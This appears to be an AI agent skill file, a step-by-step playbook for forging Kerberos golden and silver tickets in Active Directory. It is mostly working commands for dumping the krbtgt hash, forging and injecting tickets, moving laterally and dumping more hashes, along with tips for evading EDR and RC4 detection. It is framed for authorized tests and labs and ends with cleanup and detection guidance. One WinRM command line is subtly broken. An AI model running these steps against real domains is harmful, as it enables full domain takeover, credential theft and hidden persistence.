---
name: golden-ticket
description: Use when forging Kerberos tickets on an authorized Active
  Directory engagement after recovering the krbtgt account hash. Covers
  extracting the krbtgt NTLM hash with secretsdump.py from impacket 0.12.0,
  forging golden tickets with mimikatz 2.2.0 kerberos::golden and impacket
  ticketer.py, injecting them with /ptt or KRB5CCNAME, and the related
  silver ticket variant with Rubeus 2.x. Use when you hold Domain Admin
  equivalent rights and need persistent, controllable domain access for the
  rest of the test, or when a CTF or lab asks for ticket forging.
version: 1.0.0
domain: ad
lifecycle: stable
last_verified: "2026-10-23"
requires: []
extends: []
relates: [ad-enumeration, password-attacks]
tools:
  - name: mimikatz
    version: 2.2.0
  - name: impacket
    version: 0.12.0
  - name: Rubeus
    version: 2.x
  - name: Python
    version: "3.12"
---

A golden ticket is a forged Kerberos ticket granting ticket (TGT). It is
signed with the krbtgt account's hash, so the domain controller trusts it
completely, and it can carry any username, any group memberships
(including Domain Admins), and a lifetime of years. Forging one requires
the krbtgt hash, which means you already hold Domain Admin equivalent
rights, usually through DCSync. This skill covers the full authorized
workflow for Active Directory assessments, lab environments, and CTFs
only: recovering the krbtgt hash, forging the ticket with mimikatz,
ticketer, or Rubeus, using it for lateral movement, and the silver ticket
variant for single service access.

## Quick Workflow

1. Confirm you hold DCSync rights or Domain Admin equivalent access on
   the target domain.
2. Extract the krbtgt NTLM hash (and AES keys if you want AES tickets)
   with secretsdump.py.
3. Get the domain SID with lookupsid.py or PowerView.
4. Forge the golden ticket with mimikatz, ticketer.py, or Rubeus, choosing
   username, groups, and lifetime deliberately.
5. Inject the ticket into your session (/ptt on Windows, KRB5CCNAME on
   Linux).
6. Use the ticket for Kerberos authenticated access: SMB, WinRM, LDAP.
7. Keep the forged identity consistent and minimal to avoid standing out.
8. Record the forged user, groups, lifetime, and every system accessed
   for the report and for cleanup.

## 1. Recover the krbtgt hash

The krbtgt hash is the signing key for every TGT in the domain. Pull it
with a targeted DCSync that touches only this account.

```bash
# Targeted DCSync of the krbtgt account only (needs replication rights)
secretsdump.py 'corp.local/administrator:Password1@10.10.10.10' \
  -just-dc-user krbtgt

# Same, saving all output to files for the engagement record
secretsdump.py 'corp.local/administrator:Password1@10.10.10.10' \
  -just-dc-user krbtgt -outputfile loot/krbtgt
```

The output shows the NTLM hash and, on modern domains, the AES keys:

```text
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
```

Copy the NTLM hash after the second colon. If you want AES tickets
instead of RC4, note the aes256 key from the same output.

## 2. Get the domain SID

The ticket must carry the real domain SID, or the DC will reject it.

```bash
# Domain SID from lookupsid.py
lookupsid.py 'corp.local/administrator:Password1@10.10.10.10' | grep -m1 'Domain SID'
```

```powershell
# Same from PowerView on a Windows host
Get-DomainSID
```

You need a value like `S-1-5-21-1111111111-2222222222-3333333333`. Keep
it with the krbtgt hash in your notes, since every forgery needs both.

## 3. Forge the golden ticket

Mimikatz on Windows is the classic route. The `/ptt` flag injects the
ticket into the current session immediately.

```text
privilege::debug
kerberos::golden /user:ghostadmin /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /krbtgt:<krbtgt_nt_hash> /id:500 /groups:512,513,518,519,520 /ptt
```

Notes on the flags: `/user` is the forged username (it does not need to
exist), `/id:500` makes it the built in Administrator RID, and the group
RIDs 512 (Domain Admins), 513 (Domain Users), 518 (Schema Admins), 519
(Enterprise Admins), 520 (Group Policy Creator Owners) give full rights.
Set a bounded lifetime with `/endin:600` (minutes) instead of the default
ten years, unless the test plan calls for persistence.

From Linux, ticketer.py writes a ccache file you can use with any
impacket tool:

```bash
# Forge with the RC4 (NTLM) hash
ticketer.py -nthash <krbtgt_nt_hash> \
  -domain-sid S-1-5-21-1111111111-2222222222-3333333333 \
  -domain corp.local ghostadmin

# Forge with the AES256 key instead (stealthier, no RC4 downgrade)
ticketer.py -aesKey <krbtgt_aes256_key> \
  -domain-sid S-1-5-21-1111111111-2222222222-3333333333 \
  -domain corp.local ghostadmin

# Point impacket tools at the forged ticket
export KRB5CCNAME=./ghostadmin.ccache
klist
```

Rubeus covers the same ground from a Windows host without mimikatz:

```powershell
# Forge and inject in one step
Rubeus.exe golden /krbtgt:<krbtgt_nt_hash> /user:ghostadmin /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /ptt
```

## 4. Use the forged ticket

With the ticket injected, authenticate over Kerberos without any
password. Impacket tools take `-k -no-pass` to use the ccache.

```bash
# SMB access as the forged Domain Admin
export KRB5CCNAME=./ghostadmin.ccache
psexec.py -k -no-pass 'corp.local/ghostadmin@dc01.corp.local'

# Dump hashes from another DC with the same ticket
secretsdump.py -k -no-pass 'corp.local/ghostadmin@dc02.corp.local' -just-dc-user administrator

# WinRM command execution
evil-winrm -i 10.10.10.10 2>/dev/null; wmiexec.py -k -no-pass 'corp.local/ghostadmin@dc01.corp.local'
```

On Windows with the ticket in the session, normal tools just work:

```powershell
# Verify the forged identity is active
klist
# Access a protected share
dir \\dc01.corp.local\c$
```

## 5. Silver ticket variant

A silver ticket forges a service ticket for one specific service instead
of a domain wide TGT. It needs the service account's hash (for example a
machine account hash), which you may already have from a DCSync or local
SAM dump. It is quieter because the DC is never contacted.

```bash
# Forge a CIFS silver ticket for one file server (needs the machine account hash)
ticketer.py -nthash <machine_nt_hash> \
  -domain-sid S-1-5-21-1111111111-2222222222-3333333333 \
  -domain corp.local -spn cifs/fileserver.corp.local ghostadmin
export KRB5CCNAME=./ghostadmin.ccache
smbclient.py -k -no-pass 'corp.local/ghostadmin@fileserver.corp.local'
```

```powershell
# Rubeus silver ticket for the same service
Rubeus.exe silver /service:cifs/fileserver.corp.local /rc4:<machine_nt_hash> /user:ghostadmin /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /ptt
```

Use silver tickets when you only need one service and want to avoid the
noise of a domain wide golden ticket. The trade off is scope: a silver
ticket for CIFS cannot be used for LDAP or WinRM.

## 6. Stay in scope and clean up

A golden ticket is full domain compromise in a file. On an authorized
test, keep the forged identity boring: a plausible username, membership
only in the groups the test needs, and the shortest lifetime that covers
the work. Never copy the ticket or the krbtgt hash outside the engagement
systems. At the end of the test, delete the ccache files and ticket files
from every machine you touched, and tell the client the krbtgt account
must be reset twice to invalidate any forged tickets, since a single
reset leaves the previous hash valid for replication.

## Edge cases

- Ticket rejected with KRB_AP_ERR_MODIFIED: the domain SID or krbtgt
  hash is wrong. Re pull both and compare character by character.
- Clock skew over five minutes breaks Kerberos. Sync the attack box to
  the DC before forging or using tickets.
- RC4 tickets get flagged or downgraded on hardened domains. Use the
  AES256 key with ticketer.py `-aesKey` or Rubeus `/aes256` instead.
- The forged user cannot access a resource despite Domain Admin groups:
  some services check the PAC against the real directory. Add a real
  group membership or use a username that exists.
- mimikatz `kerberos::golden` fails without `privilege::debug` first.
  Run it as administrator with SeDebugPrivilege.
- KRB5CCNAME not picked up: export it in the same shell that runs the
  impacket tool, and confirm with `klist` that the ticket is listed.
- Ticket lifetime too long looks anomalous in logs. Use `/endin` in
  mimikatz or ticketer's default shorter lifetime unless persistence is
  in scope.
- Cross domain forests need the trust key, not the krbtgt hash, for the
  trusting domain. Forge against the domain whose krbtgt you actually
  hold, then cross the trust normally.

## Escalation

- No krbtgt hash yet: get DCSync rights first (see the dcsync skill),
  since golden ticket forging starts where DCSync ends.
- DCSync is blocked but you have a DC backup or ntds.dit: extract the
  krbtgt hash offline from the database file instead.
- You only have a service account hash: forge a silver ticket for that
  service rather than a golden ticket.
- The domain uses AES only and you only pulled the NTLM hash: re-run
  secretsdump and take the aes256 key from the same output.
- Need persistence that survives a krbtgt reset: that is outside normal
  test scope. Document the finding and let the client drive remediation
  instead of planting deeper persistence.
- Rubeus and mimikatz both blocked by EDR: ticketer.py from Linux
  leaves no Windows process at all.

## Detection and defender view

Defenders hunt golden tickets in Event ID 4769 (Kerberos service ticket
requested) with ticket lifetimes far above the normal ten hours, TGTs
used from hosts the user never touches, and RC4 encrypted tickets on
domains that should be AES only. Microsoft Defender for Identity raises
a dedicated suspected golden ticket alert on lifetime and encryption
anomalies. The durable fixes are: protect the krbtgt hash like the keys
to the kingdom (it is), reset the krbtgt account password twice after
any suspected compromise, enforce AES for Kerberos, and alert on 4769
events with unusual lifetimes or encryption types. A double krbtgt reset
is the only reliable way to kill existing forgeries, and it must be done
with replication time between the two resets.

## Key references

- MITRE ATT&CK T1558.001 (Steal or Forge Kerberos Tickets: Golden
  Ticket).
- MITRE ATT&CK T1558.002 (Steal or Forge Kerberos Tickets: Silver
  Ticket).
- mimikatz kerberos::golden documentation:
  https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos
- Impacket ticketer.py documentation:
  https://github.com/fortra/impacket/tree/master/examples
- Rubeus documentation:
  https://github.com/GhostPack/Rubeus
- Microsoft guidance on resetting the krbtgt account password.
